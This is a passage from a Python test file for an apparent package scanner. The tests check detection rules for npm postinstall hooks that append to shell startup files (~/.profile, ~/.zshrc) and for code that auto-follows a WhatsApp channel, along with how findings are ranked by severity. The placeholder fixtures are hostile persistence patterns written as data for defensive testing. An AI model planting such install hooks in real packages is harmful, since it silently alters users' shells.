        "const s = `PROMPT=\"$(cat p.txt)\"`; fs.writeFileSync(join(os.homedir(), 'run.sh'), s)",
    ],
)
def test_shell_startup_inject_needs_a_foreign_source_line_or_a_prompt(text: str) -> None:
    assert "inject" not in _startup_forms(text)


def test_shell_startup_hook_form_is_placed_in_the_manifest() -> None:
    text = '{\n  "scripts": {\n    "postinstall": "echo PLACEHOLDER >> ~/.profile"\n  }\n}'
    (match,) = [m for m in analyse(text.encode()) if m.rule_id == "static.shell-startup"]
    assert match.line == 3 and ">> ~/.profile" in match.snippet


def test_channel_follow_is_never_not_new_but_shell_startup_is() -> None:
    """Every release of an auto-following fork is unwanted; a CLI's PATH line is old news."""
    from kitsunox.core.models import Severity
    from kitsunox.stages.static import ALWAYS_NEW, _demoted, _key

    (follow,) = [
        m
        for m in analyse(f"const A = '{_JID}'; newsletterWMexQuery(A, QueryIds.FOLLOW)".encode())
        if m.rule_id == "static.channel-follow"
    ]
    assert follow.rule_id in ALWAYS_NEW
    assert _demoted(follow, "lib/a.js", frozenset({_key(follow)})).severity is Severity.MEDIUM
    (rc,) = [
        m
        for m in analyse(b'{"scripts": {"postinstall": "echo PLACEHOLDER >> ~/.zshrc"}}')
        if m.rule_id == "static.shell-startup"
    ]
    assert rc.severity is Severity.MEDIUM
    assert _demoted(rc, "package.json", frozenset({_key(rc)})).severity is Severity.LOW
